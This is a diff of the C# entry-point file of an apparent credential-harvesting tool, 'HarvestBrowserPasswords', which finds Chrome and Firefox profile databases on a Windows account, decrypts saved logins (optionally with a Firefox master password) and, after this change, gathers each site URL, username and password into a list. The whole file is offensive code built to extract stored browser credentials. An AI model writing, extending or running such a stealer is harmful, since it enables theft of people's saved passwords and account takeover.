@@ -10,35 +10,7 @@ using CommandLine;
 namespace HarvestBrowserPasswords
 {
     class Program
-    {
-        class Options
-        {
-            [Option('c', "chrome", HelpText = "Locate and attempt decryption of Google Chrome logins")]
-            public bool Chrome { get; set; }
-
-            [Option('f', "firefox", HelpText = "Locate and attempt decryption of Mozilla Firefox logins")]
-            public bool Firefox { get; set; }
-
-            [Option('a', "all", HelpText = "Locate and attempt decryption of Google Chrome and Mozilla Firefox logins")]
-            public bool All { get; set; }
-
-            [Option('p', "password", HelpText = "Master password for Mozilla Firefox Logins")]
-            public string Password { get; set; }
-
-            [Option('o', "outfile", HelpText = "write output to csv file")]
-            public string Outfile { get; set; }
-
-            public Options()
-            {
-                Chrome = false;
-                Firefox = false;
-                All = false;
-                Password = "";
-                Outfile = "";
-            }
-            
-        }
-        
+    { 
         static void Main(string[] args)
         {
             //Get username of current user account
@@ -47,29 +19,30 @@ namespace HarvestBrowserPasswords
             Options opts = new Options();
 
             var result = Parser.Default.ParseArguments<Options>(args)
-                .WithParsed(parsed => opts = parsed)
-                .WithNotParsed(errors => Console.WriteLine($"Not parsed: {errors}"));
+                .WithParsed(parsed => opts = parsed);
+            //.WithNotParsed(errors => Console.WriteLine($"Not parsed: {errors}"));
+
+            List<BrowserLoginData> LoginDataList = new List<BrowserLoginData>();
 
             if (opts.All)
             {
-                GetChromePasswords(userAccountName);
-                GetFirefoxPasswords(userAccountName);
+                GetChromePasswords(userAccountName, LoginDataList);
+                GetFirefoxPasswords(userAccountName, LoginDataList);
             }
             else if (opts.Chrome)
             {
-                GetChromePasswords(userAccountName);
+                GetChromePasswords(userAccountName, LoginDataList);
             }
             else if (opts.Firefox)
             {
-                if (opts.Password.Equals(null))
+                if (opts.Password.Equals(""))
                 {
-                    GetFirefoxPasswords(userAccountName);
+                    GetFirefoxPasswords(userAccountName, LoginDataList);
                 }
                 else
                 {
-                    GetFirefoxPasswords(userAccountName, opts.Password);
+                    GetFirefoxPasswords(userAccountName, opts.Password, LoginDataList);
                 }
-                
             }
         }
 
@@ -81,7 +54,7 @@ namespace HarvestBrowserPasswords
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
       
-        public static void GetChromePasswords(string userAccountName)
+        public static void GetChromePasswords(string userAccountName, List<BrowserLoginData> loginDataList)
         {
             List<string> chromeProfiles = FindChromeProfiles(userAccountName);
 
@@ -92,7 +65,16 @@ namespace HarvestBrowserPasswords
                 {
                     Console.ForegroundColor = ConsoleColor.Green;
                     Console.WriteLine($"[+] Found Chrome credential database for user: {userAccountName}");
-                    new ChromeDatabaseDecryptor(loginDataFile);
+                    ChromeDatabaseDecryptor decryptor = new ChromeDatabaseDecryptor(loginDataFile);
+
+                    BrowserLoginData loginData = new BrowserLoginData(
+                        decryptor.FormSubmitUrl,
+                        decryptor.Username,
+                        decryptor.Password,
+                        "Chrome"
+                        );
+
+                    loginDataList.Add(loginData);
                 }
             }
         }
@@ -124,28 +106,46 @@ namespace HarvestBrowserPasswords
             return profileDirectories;
         }
 
-        public static void GetFirefoxPasswords(string userAccountName)
+        public static void GetFirefoxPasswords(string userAccountName, List<BrowserLoginData> loginDataList)
         {
             string masterPassword = "";
 
             foreach (string profile in FindFirefoxProfiles(userAccountName))
             {
                 FirefoxDatabaseDecryptor decryptor = new FirefoxDatabaseDecryptor(profile, masterPassword);
+
+                BrowserLoginData loginData = new BrowserLoginData(
+                        decryptor.FormSubmitUrl,
+                        decryptor.Username,
+                        decryptor.Password,
+                        "Firefox"
+                        );
+
+                loginDataList.Add(loginData);
             }
         }
 
+        //TODO: Fuck this overload off and do both password cases in one method
         //Overload for case where master password is set
-        public static void GetFirefoxPasswords(string userAccountName, string masterPassword)
+        public static void GetFirefoxPasswords(string userAccountName, string masterPassword, List<BrowserLoginData> loginDataList)
         {
             foreach (string profile in FindFirefoxProfiles(userAccountName))
             {
                 FirefoxDatabaseDecryptor decryptor = new FirefoxDatabaseDecryptor(profile, masterPassword);
+
+                BrowserLoginData loginData = new BrowserLoginData(
+                        decryptor.FormSubmitUrl,
+                        decryptor.Username,
+                        decryptor.Password,
+                        "Firefox"
+                        );
+
+                loginDataList.Add(loginData);
             }
         }
 
         public static List<string> FindFirefoxProfiles(string userAccountName)
         {
-
             //List to store profile directories
             List<string> profileDirectories = new List<string>();
 
